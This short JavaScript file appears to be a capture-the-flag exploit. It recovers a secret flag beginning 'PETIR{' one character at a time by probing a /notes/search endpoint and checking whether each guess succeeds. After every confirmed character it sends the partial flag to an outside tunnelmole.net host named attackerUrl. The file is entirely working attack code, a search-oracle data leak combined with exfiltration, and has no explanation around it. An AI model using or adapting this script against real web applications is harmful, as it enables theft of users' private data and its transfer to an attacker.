let flag = 'PETIR{'
const attackerUrl = 'http://az1czb-ip-180-243-2-184.tunnelmole.net'
const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_'

async function exploit() {
	while (flag[flag.length - 1] !== '}') {
		let found = false
		for (const char of charset) {
			console.log(`trying ${char}`)
			const res = await fetch(`/notes/search?q=${flag + char}`)
			if (res.ok) {
				flag += char
				found = true
				fetch(`${attackerUrl}?flag=${flag}`)
				break
			}
		}
		if (!found) {
			break
		}
	}
}

exploit()
